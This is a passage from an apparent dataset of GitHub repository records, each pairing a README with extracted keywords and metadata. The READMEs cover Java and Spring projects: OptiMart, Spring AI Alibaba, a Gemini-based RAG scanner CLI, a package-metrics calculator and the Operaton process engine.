'spring', 'boot', 'openai', 'rest', 'wrapper', 'around', 'amazing', 'project', 'peterssen', 'thanks', 'alfonso', 'leading', 'way']","['operation', 'using', 'vector', 'optimize', 'wrapper']",4,0,0,"['inference', 'openai', 'chat', 'completion', 'rest', 'api', 'todo', 'on', 'apple', 'silicon', 'setup', 'build', 'download', 'llm', 'run', 'test', 'use', 'curl', 'test', 'use', 'devoxxgenie', 'baseline', 'performance', 'stats', 'key', 'finding', 'chatgpt', 'potential', 'bottleneck', 'optimization', 'idea', 'key', 'finding', 'claude', 'recommendation', 'general', 'optimization', 'credit']",16,"['test', 'use', 'key', 'finding', 'optimization']",8,3.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,8360,23.75,5.507894736842105,"['Llama3.java project -> https://github.com/mukel/llama3.java', 'DevoxxGenie -> https://plugins.jetbrains.com/plugin/24169-devoxxgenie', 'Demo2 -> https://github.com/user-attachments/assets/cbd8af2e-d3bd-4d9a-bdf5-0c2bc033915f', 'CallTree -> https://github.com/user-attachments/assets/75e739e2-44b9-4e2b-a077-63021cb9ea39', 'Llama3.java project -> https://github.com/mukel/llama3.java', 'X', 'X', ' ', ' ', ' ', ' ', ' ', ' ']",13
ngntu10/OptiMart,main,"# OptiMart

## Requirements

For building and running the application you need:

- [Node 20 & Npm 10](https://nodejs.org/en/download)
- [JDK 17](https://www.oracle.com/java/technologies/downloads/#java21)
- [Maven 3](https://maven.apache.org)

[//]: # ()
[//]: # (## Run the application locally)

[//]: # ()
[//]: # (Install the dependencies:)

[//]: # ()
[//]: # (``` bash)

[//]: # (npm install)

[//]: # (npm run prepare)

[//]: # (```)

[//]: # ()
[//]: # (Make sure to connect to your databse by defining the env file `env.properties` located in `/src/main/resources/`. For example:)

[//]: # ()
[//]: # (``` properties)

[//]: # (# /src/main/resources/env.properties)

[//]: # (DB_DDL_AUTO=update)

[//]: # (DB_URL=jdbc:postgresql://localhost:5432/postgres)

[//]: # (DB_USERNAME=your_username)

[//]: # (DB_PASSWORD=your_password)

[//]: # (```)

[//]: # ()
[//]: # (Run the server:)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn spring-boot:run)

[//]: # (```)

[//]: # ()
[//]: # (Use a browser to navigate to [http://localhost:8080/swagger-ui/index.html]&#40;http://localhost:8080/api/v1/swagger-ui/index.html&#41;.)

[//]: # ()
[//]: # (## Run tests)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn test)

[//]: # (```)

[//]: # ()
[//]: # (## Other commands)

[//]: # ()
[//]: # (### Format code)

[//]: # ()
[//]: # (``` bash)

[//]: # (mvn fmt:format)

[//]: # (```)

[//]: # (## How to name a branch?)

[//]: # ()
[//]: # (Branch name pattern:)

[//]: # ()
[//]: # ()
[//]: # (```text)

[//]: # (type/description-in-kebab-case)

[//]: # ()
[//]: # (type/issue-#{issue_number})

[//]: # ()
[//]: # (```)

[//]: # ()
[//]: # (Examples:)

[//]: # ()
[//]: # (```text)

[//]: # (feature/issue-#99)

[//]: # (```)

[//]: # ()
[//]: # (```text)

[//]: # (hotfix/quick-fix-for-an-emergency)

[//]: # (```)

[//]: # ()
[//]: # (Common types according to [simplified convention for naming branches]&#40;https://dev.to/varbsan/a-simplified-convention-for-naming-branches-and-commits-in-git-il4&#41;)

[//]: # (- feature: adding, refactoring or removing a feature)

[//]: # (- bugfix: fixing a bug)

[//]: # (- hotfix: changing code with a temporary solution and/or without following the usual process &#40;usually because of an emergency&#41;)

[//]: # (- test: experimenting outside of an issue/ticket)

[//]: # ()

## How to name a commit message?

**Commitlint** checks if your commit messages meet the [conventional commit format](https://conventionalcommits.org).

Commit message pattern:

```sh
type(scope?): subject  #scope is optional; multiple scopes are supported (current delimiter options: ""/"", ""\"" and "","")
```

Examples:

```text
chore: run tests on travis ci
```

```text
fix(server): send cors headers
```

```text
feat(blog): add comment section
```

Common types according to [commitlint-config-conventional (based on the Angular convention)](https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-conventional#type-enum) can be:

- build
- chore
- ci
- docs
- feat
- fix
- perf
- refactor
- revert
- style
- test

[//]: # (## References)

[//]: # ()
[//]: # (Read these references if needed:)

[//]: # ()
[//]: # (- [Open api swagger]&#40;https://springdoc.org/&#41;)

[//]: # (- [Lombok]&#40;https://codippa.com/lombok/&#41;)

[//]: # (- [JPA/Hibernate entity relationships]&#40;https://www.baeldung.com/jpa-hibernate-associations&#41;)

[//]: # (- [Hibernate type mappings]&#40;https://vladmihalcea.com/a-beginners-guide-to-hibernate-types/&#41;)",0,1,2,apache-2.0,1.0,"['optimart', 'requirements', 'building', 'running', 'application', 'need', 'node', 'npm', 'jdk', 'maven', 'name', 'commit', 'message', 'commitlint', 'check', 'commit', 'message', 'meet', 'conventional', 'commit', 'format', 'commit', 'message', 'pattern', 'example', 'common', 'type', 'according', 'based', 'angular', 'convention', 'build', 'chore', 'ci', 'doc', 'feat', 'fix', 'perf', 'refactor', 'revert', 'style', 'test']","['commit', 'message', 'optimart', 'requirements', 'building']",3,0,0,"['optimart', 'requirement', 'run', 'application', 'locally', 'install', 'dependency', 'bash', 'npm', 'install', 'npm', 'run', 'prepare', 'make', 'sure', 'connect', 'databse', 'define', 'env', 'file', 'locate', 'for', 'example', 'property', 'postgresql', 'run', 'server', 'bash', 'mvn', 'run', 'use', 'browser', 'navigate', 'http', 'http', 'run', 'test', 'bash', 'mvn', 'test', 'other', 'command', 'format', 'code', 'bash', 'mvn', 'fmt', 'format', 'how', 'name', 'branch', 'branch', 'name', 'pattern', 'text', 'example', 'text', 'text', 'common', 'type', 'accord', 'simplify', 'convention', 'name', 'branch', 'http', 'feature', 'add', 'refactoring', 'remove', 'feature', 'bugfix', 'fixing', 'bug', 'hotfix', 'changing', 'code', 'temporary', 'solution', 'without', 'follow', 'usual', 'process', 'usually', 'emergency', 'test', 'experimenting', 'outside', 'how', 'name', 'commit', 'message', 'reference', 'read', 'reference', 'need', 'open', 'api', 'swagger', 'http', 'lombok', 'http', 'entity', 'relationship', 'http', 'hibernate', 'type', 'mapping', 'http']",80,"['http', 'run', 'bash', 'name', 'mvn']",12,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,3497,52.85714285714285,5.294594594594595,"['Node 20 & Npm 10 -> https://nodejs.org/en/download', 'JDK 17 -> https://www.oracle.com/java/technologies/downloads/#java21', 'Maven 3 -> https://maven.apache.org', 'conventional commit format -> https://conventionalcommits.org', 'commitlint-config-conventional (based on the Angular convention) -> https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-conventional#type-enum', 'simplified convention for naming branches', 'Open api swagger', 'Lombok', 'Hibernate type mappings']",9
alibaba/spring-ai-alibaba,main,"# [Spring AI Alibaba](https://sca.aliyun.com/ai/)

[中文版本](./README-zh.md)

An AI application framework for Java developers built on top of Spring AI that provides seamless integration with Alibaba Cloud QWen LLM services and cloud-native infrastructures.

## Get Started
Please refer to [quick start](https://sca.aliyun.com/ai/get-started/) for how to quickly add generative AI to your Spring Boot applications.

Overall, it takes only two steps to turn your Spring Boot application into an intelligent agent:

> Because Spring AI Alibaba is developed based on Spring Boot 3.x, it requires JDK version 17 and above.

1. Add 'spring-ai-alibaba-starter' dependency to your project.

```xml
<dependency>
	<groupId>com.alibaba.cloud.ai</groupId>
	<artifactId>spring-ai-alibaba-starter</artifactId>
	<version>1.0.0-M3.1</version>
</dependency>
```

> NOTICE! Since spring-ai related packages haven't been published to the central repo yet, it's needed to add the following maven repository to your project in order to successfully resolve artifacts like  spring-ai-core.
>
> ```xml
> <repositories>
> 	<repository>
> 		<id>spring-milestones</id>
> 		<name>Spring Milestones</name>
> 		<url>https://repo.spring.io/milestone</url>
> 		<snapshots>
> 			<enabled>false</enabled>
> 		</snapshots>
> 	</repository>
> </repositories>
> ```
> Addendum: If the mirrorOf tag in your local Maven settings. xml is configured with the wildcard *, please modify it according to the following example.
> ```xml
> <mirror>
>   <id>xxxx</id>
>   <mirrorOf>*,!spring-milestones</mirrorOf>
>   <name>xxxx</name>
>   <url>xxxx</url>
> </mirror>
> ```

2. Inject the default `ChatClient` Bean to regular Controller beans.

```java
@RestController
public class ChatController {

	private final ChatClient chatClient;

	public ChatController(ChatClient.Builder builder) {
		this.chatClient = builder.build();
	}

	@GetMapping(""/chat"")
	public String chat(String input) {
		return this.chatClient.prompt()
				.user(input)
				.call()
				.content();
	}
}
```

## Examples
More examples can be found at [spring-ai-alibaba-examples](./spring-ai-alibaba-examples).

* Hello World
* Chat Model
* Multi Model
* Function Calling
* Structured Output
* Prompt
* RAG
* Flight Booking Playground, an advanced example showcasing usage of prompt template, function calling, chat memory and rag at the same time.

## Core Features

Spring AI Alibaba provides the following features, read the [documentation](https://sca.aliyun.com/ai) on our website for more details of how to use these features.

* Support for Alibaba Cloud QWen Model and Dashscope Model service.
* Support high-level AI agent abstraction -- ChatClient.
* Support various Model types like Chat, Text to Image, Audio Transcription, Text to Speech.
* Both synchronous and stream API options are supported.
* Mapping of AI Model output to POJOs.
* Portable API across Vector Store providers.
* Function calling.
* Spring Boot Auto Configuration and Starters.
* RAG (Retrieval-Augmented Generation) support: DocumentReader, Splitter, Embedding, VectorStore, and Retriever.
* Support conversation with ChatMemory

## Roadmap

Spring AI Alibaba aims to reduce the complexity of building ai native java applications, from development, evaluation to deployment and observability. In order to achieve that, we provide both open-source framework and ecosystem integrations around it, below are the features that we plan to support in the near future:
* Prompt Template Management
* Event Driven AI Application
* Support of more Vector Databases
* Function Deployment
* Observability
* AI proxy support: prompt filtering, rate limit, multiple Model, etc.
* Development Tools

![ai-native-architecture](./docs/imgs/spring-ai-alibaba-arch.png)

## References
* [Spring AI](https://docs.spring.io/spring-ai/reference/index.html)
* [Alibaba Cloud Dashscope Model Service Platform (阿里云百炼模型服务及应用开发平台)](https://help.aliyun.com/zh/model-studio/getting-started/what-is-model-studio/)

## Contact Us
* Dingtalk Group (钉钉群), search `64485010179` and join.
* Wechat Group (微信公众号), scan the QR code below and follow us.

<img src=""./docs/imgs/wechat-account.png"" style=""width:260px;""/>
",3,13,3,apache-2.0,56.0,"['spring', 'ai', 'alibaba', 'ai', 'application', 'framework', 'java', 'developer', 'built', 'top', 'spring', 'ai', 'provides', 'seamless', 'integration', 'alibaba', 'cloud', 'qwen', 'llm', 'service', 'infrastructure', 'get', 'started', 'please', 'refer', 'quick', 'start', 'quickly', 'add', 'generative', 'ai', 'spring', 'boot', 'application', 'overall', 'take', 'two', 'step', 'turn', 'spring', 'boot', 'application', 'intelligent', 'agent', 'spring', 'ai', 'alibaba', 'developed', 'based', 'spring', 'boot', 'requires', 'jdk', 'version', 'add', 'dependency', 'project', 'notice', 'since', 'related', 'package', 'published', 'central', 'repo', 'yet', 'needed', 'add', 'following', 'maven', 'repository', 'project', 'order', 'successfully', 'resolve', 'artifact', 'like', 'addendum', 'mirrorof', 'tag', 'local', 'maven', 'setting', 'xml', 'configured', 'wildcard', 'please', 'modify', 'according', 'following', 'example', 'inject', 'default', 'bean', 'regular', 'controller', 'bean', 'example', 'example', 'found', 'hello', 'world', 'chat', 'model', 'multi', 'model', 'function', 'calling', 'structured', 'output', 'prompt', 'rag', 'flight', 'booking', 'playground', 'advanced', 'example', 'showcasing', 'usage', 'prompt', 'template', 'function', 'calling', 'chat', 'memory', 'rag', 'time', 'core', 'feature', 'spring', 'ai', 'alibaba', 'provides', 'following', 'feature', 'read', 'documentation', 'website', 'detail', 'use', 'feature', 'support', 'alibaba', 'cloud', 'qwen', 'model', 'dashscope', 'model', 'service', 'support', 'ai', 'agent', 'abstraction', 'chatclient', 'support', 'various', 'model', 'type', 'like', 'chat', 'text', 'image', 'audio', 'transcription', 'text', 'speech', 'synchronous', 'stream', 'api', 'option', 'supported', 'mapping', 'ai', 'model', 'output', 'pojos', 'portable', 'api', 'across', 'vector', 'store', 'provider', 'function', 'calling', 'spring', 'boot', 'auto', 'configuration', 'starter', 'rag', 'generation', 'support', 'documentreader', 'splitter', 'embedding', 'vectorstore', 'retriever', 'support', 'conversation', 'chatmemory', 'roadmap', 'spring', 'ai', 'alibaba', 'aim', 'reduce', 'complexity', 'building', 'ai', 'native', 'java', 'application', 'development', 'evaluation', 'deployment', 'observability', 'order', 'achieve', 'provide', 'framework', 'ecosystem', 'integration', 'around', 'feature', 'plan', 'support', 'near', 'future', 'prompt', 'template', 'management', 'event', 'driven', 'ai', 'application', 'support', 'vector', 'database', 'function', 'deployment', 'observability', 'ai', 'proxy', 'support', 'prompt', 'filtering', 'rate', 'limit', 'multiple', 'model', 'etc', 'development', 'tool', 'references', 'spring', 'ai', 'alibaba', 'cloud', 'dashscope', 'model', 'service', 'platform', 'contact', 'u', 'dingtalk', 'group', 'search', 'join', 'wechat', 'group', 'scan', 'qr', 'code', 'follow', 'u']","['ai', 'spring', 'model', 'support', 'alibaba']",6,0,0,"['spring', 'ai', 'alibaba', 'http', 'get', 'start', 'example', 'core', 'feature', 'roadmap', 'reference', 'contact', 'u']",7,"['spring', 'ai', 'alibaba', 'http', 'get']",4,47.0,13.0,"[com.mycila:license-maven-plugin,io.spring.javaformat:spring-javaformat-maven-plugin,maven-clean-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,11.0,2.0,4190,19.96551724137931,5.449050086355786,"['Spring AI Alibaba -> https://sca.aliyun.com/ai/', 'quick start -> https://sca.aliyun.com/ai/get-started/', 'documentation -> https://sca.aliyun.com/ai', 'Spring AI -> https://docs.spring.io/spring-ai/reference/index.html', 'Alibaba Cloud Dashscope Model Service Platform (阿里云百炼模型服务及应用开发平台) -> https://help.aliyun.com/zh/model-studio/getting-started/what-is-model-studio/']",5
Lunatix01/ragscan,master,"Simple CLI Retrieval Augmented Generation Scanner
=================================================
Aim of the project: A showcase of a RAG scanner written in Java and using [Spring AI](https://docs.spring.io/spring-ai/reference/api/index.html), which scans the targeted documents and you can ask questions to the LLM regarding the given documents.

## Disclaimer
This tool is intended for educational and productivity purposes only. It is designed to assist users in managing and querying their own documents. Any illegal or unethical use of this software is strictly prohibited.

## Requirements
1. [Java 21](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html) installed on your device
2. [Docker](https://www.docker.com/products/docker-desktop/)
3. An environment variable named `GOOGLE_API_KEY` and add your [Google Gemini API key](https://ai.google.dev/gemini-api/docs/api-key)

## Installation
1. Navigate to the project directory
2. Open CMD/Powershell/Terminal
3. For Windows Run `./mvnw clean install`, for Linux/Mac run `./mvn clean install`

## How to use:
1. Run `docker-compose up` in your CMD/Powershell/Terminal
2. Run the project using maven, on Windows: `./mvnw spring-boot:run`, on Linux/Mac run `./mvn spring-boot:run`.
3. When the shell opens type `collection-size 768` (for Gemini `768` is compatible).
4. Place your files in a directory, copy the full path of the directory, and run something like this `load /your/path`, wait till the files are chunked and loaded to `Qdrant vector database`.
5. Finally in the shell write `ask ""your question here""` and that's it.


### Notes
It's a simple project, needs a lot of improvements like: 
1. Improve chunking documents (Currently chunked by token size)
2. Support more file types (Currently supports txt, HTML, JSON, MD, docx, ppt, pdf, and a lot more)
3. Support other Chat models like GPT, Ollama, etc... (currently supports Gemini version `gemini-1.5-flash-latest`, the reason I decided to use Gemini is because it has a good free tier)
4. Support to make it a standalone executable and a jar file, (Currently you can build it yourself and run it, it has no problem, but I will simplify it)
5. Support other vector databases ( Currently supports Qdrant, to be honest, it's good enough)
6. Support custom System Context and custom similar returned documents in DB (Default, for now, is 5.)

#### Rabbit hole
Don't try to retrieve an API key from older `.git` versions, it's a rabbit hole :)

Please create an Issue, if something is wrong I will look into it, and feel free to contribute to the project.
==============
",0,2,2,mit,2.0,"['simple', 'cli', 'retrieval', 'augmented', 'generation', 'scanner', 'aim', 'project', 'showcase', 'rag', 'scanner', 'written', 'java', 'using', 'spring', 'ai', 'scan', 'targeted', 'document', 'ask', 'question', 'llm', 'regarding', 'given', 'document', 'disclaimer', 'tool', 'intended', 'educational', 'productivity', 'purpose', 'designed', 'assist', 'user', 'managing', 'querying', 'document', 'illegal', 'unethical', 'use', 'software', 'strictly', 'prohibited', 'requirements', 'java', 'installed', 'device', 'docker', 'environment', 'variable', 'named', 'add', 'google', 'gemini', 'api', 'key', 'installation', 'navigate', 'project', 'directory', 'open', 'window', 'run', 'run', 'use', 'run', 'run', 'project', 'using', 'maven', 'window', 'run', 'shell', 'open', 'type', 'gemini', 'compatible', 'place', 'file', 'directory', 'copy', 'full', 'path', 'directory', 'run', 'something', 'like', 'wait', 'till', 'file', 'chunked', 'loaded', 'finally', 'shell', 'write', 'note', 'simple', 'project', 'need', 'lot', 'improvement', 'like', 'improve', 'chunking', 'document', 'currently', 'chunked', 'token', 'size', 'support', 'file', 'type', 'currently', 'support', 'txt', 'html', 'json', 'md', 'docx', 'ppt', 'pdf', 'lot', 'support', 'chat', 'model', 'like', 'gpt', 'ollama', 'etc', 'currently', 'support', 'gemini', 'version', 'reason', 'decided', 'use', 'gemini', 'good', 'free', 'tier', 'support', 'make', 'standalone', 'executable', 'jar', 'file', 'currently', 'build', 'run', 'problem', 'simplify', 'support', 'vector', 'database', 'currently', 'support', 'qdrant', 'honest', 'good', 'enough', 'support', 'custom', 'system', 'context', 'custom', 'similar', 'returned', 'document', 'db', 'default', 'rabbit', 'hole', 'try', 'retrieve', 'api', 'key', 'older', 'version', 'rabbit', 'hole', 'please', 'create', 'issue', 'something', 'wrong', 'look', 'feel', 'free', 'contribute', 'project']","['support', 'run', 'project', 'document', 'currently']",0,0,0,"['disclaimer', 'requirement', 'installation', 'how', 'use', 'note', 'rabbit', 'hole']",6,"['disclaimer', 'requirement', 'installation', 'how', 'use']",0,0.0,1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,2615,15.357142857142858,4.537209302325581,"['Spring AI -> https://docs.spring.io/spring-ai/reference/api/index.html', 'Java 21 -> https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html', 'Docker -> https://www.docker.com/products/docker-desktop/', 'Google Gemini API key -> https://ai.google.dev/gemini-api/docs/api-key']",4
xsreality/abstractness-instability-calculator,main,"# Abstractness and Instability Metrics Calculator

This application calculates abstractness and instability metrics for Java, Spring Boot projects, helping developers analyze the structure and dependencies of their codebase.

It follows the principles of Spring Modulith by analyzing the [application module packages](https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple). These are direct sub-packages of the _main_ package that contains the `@SpringBootApplication` annotated class. Ideally, these packages are expected to be functional layers rather than technical layers (controller, services, repositories etc.).

A [Nix Flake](#nix-flake) is provided to help build on systems with outdated java and maven installations.

![screenshot](https://github.com/user-attachments/assets/a496037d-62b2-42b5-809f-0eec2f63018a)

Dependency Visualization

![dependency_visualization_recording](https://github.com/user-attachments/assets/83ed8bae-5b0d-4b8c-a356-820e29c3ebad)

## Features

- Scans Spring Boot projects to identify packages and their relationships
- Calculates abstractness, instability, and distance from the main sequence for each package
- Provides a web interface for easy project analysis
- Visualizes results using an interactive scatter plot
- Dependency visualization

## Prerequisites

- Java 22 or higher
- Maven 3.6 or higher

## Installation

1. Clone the repository:
   ```
   git clone https://github.com/xsreality/abstractness-instability-calculator.git
   ```

2. Navigate to the project directory:
   ```
   cd abstractness-instability-calculator
   ```

3. Build the project:
   ```
   mvn clean install
   ```

## Usage

1. Run the application:
   ```
   java -jar target/abstractness-instability-calculator-1.0-SNAPSHOT.jar
   ```

2. Open a web browser and go to `http://localhost:8080`

3. Enter the path to your Java project in the input field

4. Click ""Scan"" to analyze the project

5. View the results in the interactive scatter plot

## Nix Flake

1. Enter development environment
   ```
   nix develop
   ```

2. Build application
   ```
   mvn clean package -DskipTests
   ```

3. Run application
   ```
   java -jar target/abstractness-instability-calculator*.jar
   ```

## Understanding the Results

The scatter plot visualizes three key metrics for each package:

### Instability (I)
- **Range**: 0 to 1
- **Interpretation**: 
  - 0: Maximally stable
  - 1: Maximally unstable
- **Calculation**: I = Ce / (Ca + Ce), where:
  - Ce: Efferent Couplings (outgoing dependencies)
  - Ca: Afferent Couplings (incoming dependencies)
- **Practical Use**: 
  - Helps identify packages that are more likely to change due to changes in other packages.
  - Stable packages (low I) are good candidates for being depended upon.
  - Unstable packages (high I) should generally depend on stable packages to maintain system stability.

### Abstractness (A)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Completely concrete
  - 1: Completely abstract
- **Calculation**: A = (Number of abstract classes and interfaces) / (Total number of classes)
- **Practical Use**:
  - Indicates the level of abstraction in a package.
  - Highly abstract packages (high A) are often more flexible but may be less directly usable.
  - Concrete packages (low A) are typically more immediately usable but may be less flexible.

### Distance from the Main Sequence (D)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Directly on the Main Sequence (optimal)
  - 1: Furthest from the Main Sequence (problematic)
- **Calculation**: D = |A + I - 1|
- **Practical Use**:
  - Measures how well a package balances abstractness and stability.
  - Packages close to the Main Sequence (low D) are considered well-designed.
  - Helps identify packages that may need refactoring or restructuring.

### Interpreting the Scatter Plot

The plot visualizes these metrics and highlights two important zones:

1. **Zone of Pain** (Bottom-left corner):
   - High stability (low I) and low abstractness (low A)
   - Packages here are difficult to extend and have many dependents
   - Example: A database schema class that many other classes depend on

2. **Zone of Uselessness** (Top-right corner):
   - Low stability (high I) and high abstractness (high A)
   - Packages here are abstract but have no dependents, indicating potentially unused code
   - Example: An over-engineered set of interfaces with no implementations

3. **Main Sequence** (Diagonal line from top-left to bottom-right):
   - Represents an ideal balance between abstractness and instability
   - Packages should aim to be close to this line

### Color Coding
- **Green**: Packages close to the Main Sequence (D ≤ 0.5)
- **Red**: Packages far from the Main Sequence (D > 0.5)

### Practical Application
- Use these metrics to identify packages that may need refactoring:
  - Packages in the Zone of Pain might benefit from increased abstraction.
  - Packages in the Zone of Uselessness might need to be made more concrete or removed if unused.
  - Red packages (high D) are primary candidates for restructuring.
- Monitor these metrics over time to ensure your codebase maintains a good structure as it evolves.
- Use in conjunction with other software quality metrics and practices for a comprehensive view of your codebase's health.

While these metrics provide valuable insights, they should not be treated as absolute rules. Always consider the specific context and requirements of your project when making architectural decisions.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

",0,0,2,mit,9.0,"['abstractness', 'instability', 'metric', 'calculator', 'application', 'calculates', 'abstractness', 'instability', 'metric', 'java', 'spring', 'boot', 'project', 'helping', 'developer', 'analyze', 'structure', 'dependency', 'codebase', 'follows', 'principle', 'spring', 'modulith', 'analyzing', 'application', 'module', 'package', 'direct', 'main', 'package', 'contains', 'annotated', 'class', 'ideally', 'package', 'expected', 'functional', 'layer', 'rather', 'technical', 'layer', 'controller', 'service', 'repository', 'etc', 'nix', 'flake', 'provided', 'help', 'build', 'system', 'outdated', 'java', 'maven', 'installation', 'dependency', 'visualization', 'feature', 'scan', 'spring', 'boot', 'project', 'identify', 'package', 'relationship', 'calculates', 'abstractness', 'instability', 'distance', 'main', 'sequence', 'package', 'provides', 'web', 'interface', 'easy', 'project', 'analysis', 'visualize', 'result', 'using', 'interactive', 'scatter', 'plot', 'dependency', 'visualization', 'prerequisite', 'java', 'higher', 'maven', 'higher', 'installation', 'clone', 'repository', 'navigate', 'project', 'directory', 'build', 'project', 'usage', 'run', 'application', 'open', 'web', 'browser', 'go', 'enter', 'path', 'java', 'project', 'input', 'field', 'click', 'scan', 'analyze', 'project', 'view', 'result', 'interactive', 'scatter', 'plot', 'nix', 'flake', 'enter', 'development', 'environment', 'build', 'application', 'run', 'application', 'understanding', 'results', 'scatter', 'plot', 'visualizes', 'three', 'key', 'metric', 'package', 'instability', 'range', 'interpretation', 'maximally', 'stable', 'maximally', 'unstable', 'calculation', 'ce', 'ca', 'ce', 'ce', 'efferent', 'coupling', 'outgoing', 'dependency', 'ca', 'afferent', 'coupling', 'incoming', 'dependency', 'practical', 'use', 'help', 'identify', 'package', 'likely', 'change', 'due', 'change', 'package', 'stable', 'package', 'low', 'good', 'candidate', 'depended', 'upon', 'unstable', 'package', 'high', 'generally', 'depend', 'stable', 'package', 'maintain', 'system', 'stability', 'abstractness', 'range', 'interpretation', 'completely', 'concrete', 'completely', 'abstract', 'calculation', 'number', 'abstract', 'class', 'interface', 'total', 'number', 'class', 'practical', 'use', 'indicates', 'level', 'abstraction', 'package', 'highly', 'abstract', 'package', 'high', 'often', 'flexible', 'may', 'less', 'directly', 'usable', 'concrete', 'package', 'low', 'typically', 'immediately', 'usable', 'may', 'less', 'flexible', 'distance', 'main', 'sequence', 'range', 'interpretation', 'directly', 'main', 'sequence', 'optimal', 'furthest', 'main', 'sequence', 'problematic', 'calculation', 'practical', 'use', 'measure', 'well', 'package', 'balance', 'abstractness', 'stability', 'package', 'close', 'main', 'sequence', 'low', 'considered', 'help', 'identify', 'package', 'may', 'need', 'refactoring', 'restructuring', 'interpreting', 'scatter', 'plot', 'plot', 'visualizes', 'metric', 'highlight', 'two', 'important', 'zone', 'zone', 'pain', 'corner', 'high', 'stability', 'low', 'low', 'abstractness', 'low', 'package', 'difficult', 'extend', 'many', 'dependent', 'example', 'database', 'schema', 'class', 'many', 'class', 'depend', 'zone', 'uselessness', 'corner', 'low', 'stability', 'high', 'high', 'abstractness', 'high', 'package', 'abstract', 'dependent', 'indicating', 'potentially', 'unused', 'code', 'example', 'set', 'interface', 'implementation', 'main', 'sequence', 'diagonal', 'line', 'represents', 'ideal', 'balance', 'abstractness', 'instability', 'package', 'aim', 'close', 'line', 'color', 'coding', 'green', 'package', 'close', 'main', 'sequence', 'red', 'package', 'far', 'main', 'sequence', 'practical', 'application', 'use', 'metric', 'identify', 'package', 'may', 'need', 'refactoring', 'package', 'zone', 'pain', 'might', 'benefit', 'increased', 'abstraction', 'package', 'zone', 'uselessness', 'might', 'need', 'made', 'concrete', 'removed', 'unused', 'red', 'package', 'high', 'primary', 'candidate', 'restructuring', 'monitor', 'metric', 'time', 'ensure', 'codebase', 'maintains', 'good', 'structure', 'evolves', 'use', 'conjunction', 'software', 'quality', 'metric', 'practice', 'comprehensive', 'view', 'codebase', 'health', 'metric', 'provide', 'valuable', 'insight', 'treated', 'absolute', 'rule', 'always', 'consider', 'specific', 'context', 'requirement', 'project', 'making', 'architectural', 'decision', 'contributing', 'contribution', 'welcome', 'please', 'feel', 'free', 'submit', 'pull', 'request', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'license', 'file', 'detail']","['package', 'project', 'main', 'abstractness', 'metric']",2,0,0,"['abstractness', 'instability', 'metric', 'calculator', 'feature', 'prerequisite', 'installation', 'usage', 'nix', 'flake', 'understand', 'result', 'instability', 'i', 'abstractness', 'a', 'distance', 'main', 'sequence', 'd', 'interpret', 'scatter', 'plot', 'color', 'cod', 'practical', 'application', 'contribute', 'license']",15,"['abstractness', 'instability', 'metric', 'calculator', 'feature']",7,13.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,5719,19.425,5.526383526383526,"['application module packages -> https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple', 'screenshot -> https://github.com/user-attachments/assets/a496037d-62b2-42b5-809f-0eec2f63018a', 'dependency_visualization_recording -> https://github.com/user-attachments/assets/83ed8bae-5b0d-4b8c-a356-820e29c3ebad']",3
operaton/operaton,main,"# Operaton - The open source process engine

![build status](https://github.com/operaton/operaton/actions/workflows/build.yml/badge.svg?branch=main)
[![sonarqube](https://img.shields.io/sonar/tests/operaton_operaton?server=https%3A%2F%2Fsonarcloud.io&logo=sonarcloud)](https://sonarcloud.io/project/overview?id=operaton_operaton)
[![Maven Central Version](https://img.shields.io/maven-central/v/org.operaton.bpm/operaton-bom-root?color=blue&logo=apachemaven)](https://central.sonatype.com/search?q=org.operaton)
[![operaton manual latest](https://img.shields.io/badge/manual-latest-brown.svg)](https://docs.operaton.org/) [![License](https://img.shields.io/github/license/operaton/operaton?color=blue&logo=apache)](https://github.com/operaton/operaton/blob/main/LICENSE) [![Forum](https://img.shields.io/badge/forum-operaton-green)](https://forum.operaton.org/)

Operaton is a native BPMN 2.0 process engine that runs inside the Java Virtual Machine. It can be embedded inside any Java application and any Runtime Container. It integrates with Java EE 6 and is a perfect match for the Spring Framework. On top of the process engine, you can choose from a stack of tools for human workflow management, operations and monitoring.

- Web Site: https://www.operaton.org/
- Getting Started: https://docs.operaton.org/
- User Forum: https://forum.operaton.org/
- Issue Tracker: https://github.com/operaton/operaton/issues

### This is a fork of the Camunda 7 BPM platform

We have not removed the old issue links and they still lead to Camunda's JIRA or the GitHub repo.

### What we plan to do and where we are going
Take a look at our [Roadmap](https://www.operaton.org/en/#roadmap)

### Want to talk to us or other people around Operaton?
Visit our [Forum](https://forum.operaton.org)

## Components

Operaton provides a rich set of components centered around the BPM lifecycle.

#### Process Implementation and Execution

- Operaton Engine - The core component responsible for executing BPMN 2.0 processes.
- REST API - The REST API provides remote access to running processes.
- Spring, CDI Integration - Programming model integration that allows developers to write Java Applications that interact with running processes.

#### Process Operations

- Operaton Engine - JMX and advanced Runtime Container Integration for process engine monitoring.
